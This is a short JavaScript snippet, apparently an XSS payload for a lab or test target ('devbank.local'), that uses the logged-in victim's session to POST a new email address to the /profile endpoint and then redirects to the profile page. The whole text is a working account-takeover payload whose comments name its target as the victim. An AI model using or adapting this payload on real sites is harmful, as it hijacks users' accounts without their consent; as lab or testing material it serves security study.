// Change the logged-in victim's email through the profile endpoint
fetch('/profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    credentials: 'same-origin',
    body: 'email=xss-35389397%40devbank.local'
})
.then(() => {
    // Open the profile page so the account change is visible
    window.location = '/profile';
});